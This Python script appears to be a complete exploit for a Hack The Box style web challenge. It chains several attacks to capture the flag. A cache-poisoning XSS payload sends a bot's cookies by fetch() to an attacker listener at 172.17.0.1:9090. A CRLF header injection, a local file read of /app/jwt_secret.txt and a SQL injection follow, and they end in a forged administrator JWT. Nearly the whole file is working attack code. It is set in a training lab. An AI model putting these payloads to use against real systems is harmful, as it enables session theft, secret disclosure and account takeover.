import time, urllib, requests, multiprocessing, base64, jwt
from flask import Flask

HOST, PORT = "127.0.0.1", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"
EXFIL_HOST, EXFIL_PORT = "172.17.0.1", 9090
EXFIL_URL = f"http://{EXFIL_HOST}:{EXFIL_PORT}"

def start_server():
    print("[+] Started Flask server")
    app = Flask(__name__)
    
    @app.route("/jwt/<value>", methods=["GET"])
    def index(value):
        decoded = base64_decode(value)
        jwt = decoded.split("jwt=")[1]
        print("[+] Leaked moderator jwt:", jwt)
        leak_secret(jwt)
        return "ok", 200

    app.run(host="0.0.0.0", port=EXFIL_PORT, debug=False)


def str_to_hex(string):
    return "0x" + "".join([hex(ord(char))[2:] for char in string])


def url_encode(string):
    return urllib.parse.quote(string, safe="")


def base64_decode(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode("utf-8")
    return decoded_string


def sql_injection(signature):
    encoded_signature = str_to_hex(signature)
    sqli_payload = f"';UPDATE signatures SET signature = {encoded_signature} WHERE user_id = 1#"
    encoded_sqli = url_encode(sqli_payload)
    return encoded_sqli


def create_jwt(payload, secret):
    return jwt.encode(payload, secret, algorithm="HS256")


def get_flag(jwt):
    cookies = {
        "jwt": jwt
    }
    resp = requests.get(f"{CHALLENGE_URL}/controller/admin", cookies=cookies)
    
    flag = "HTB{" + resp.text.split("HTB{")[1].split("}")[0] + "}"
    print(flag)


def add_malicious_signature(signature, old_jwt, new_jwt):
    print("[+] Adding malicous signature via sqli")
    
    sqli = sql_injection(signature)

    cookies = {
        "jwt": old_jwt
    }

    requests.get(f"{CHALLENGE_URL}/controller/device/1{sqli}", cookies=cookies)

    print("[+] Added")
    get_flag(new_jwt)


def forge_jwt(secret, old_jwt):
    print("[+] Forging malicious jwt")

    jwt_payload = {
        "user_id": 1,
        "username": "lean",
        "account_type": "administrator"
    }

    jwt = create_jwt(jwt_payload, secret)
    jwt_signature = jwt.split(".")[-1]
    add_malicious_signature(jwt_signature, old_jwt, jwt)


def leak_secret(jwt):
    print("[+] Leaking jwt secret via lfi")
    time.sleep(10)

    cookies = {
        "jwt": jwt
    }

    data = {
        "patch": "/app/jwt_secret.txt"
    }
    
    resp = requests.post(f"{CHALLENGE_URL}/controller/firmware", cookies=cookies, data=data)
    jwt_secret = resp.text

    print("[+] Secret leaked:", jwt_secret)
    forge_jwt(jwt_secret, jwt)


def check_bot():
    resp = requests.get(f"{CHALLENGE_URL}/controller/bot_running")
    if resp.text == "running":
        return True
    else:
        return False


def poison_cache():
    if not check_bot():
        return False

    print("[+] Bot activation detected, poisoning cache in 3 seconds")
    time.sleep(3)
    
    xss = f"<script>fetch('{EXFIL_URL}/jwt/'+btoa(document.cookie))</script>"
    print("[+] Xss payload:", xss)
    encoded_xss = url_encode(xss)
    print(" | Encoded:", xss)

    injected_headers = "\r\nCacheKey: enable\r\nX-Content-Type-Options: undefined"
    print("[+] Header injection payload:", injected_headers.replace("\r\n", "\\r\\n"))
    encoded_headers = url_encode(injected_headers)
    print(" | Encoded:", encoded_headers)

    requests.get(f"{CHALLENGE_URL}/oracle/{encoded_xss}/1{encoded_headers}")
    print("[+] Cache poisoned")


def poison_loop():
    print("[+] Waiting for chrome bot race condition window to open...")
    while True:
        poison_cache()
        time.sleep(1)


def pwn():
    server = multiprocessing.Process(target=start_server)
    poison = multiprocessing.Process(target=poison_loop)
    server.start()
    poison.start()


def main():
    pwn()


if __name__ == "__main__":
        main()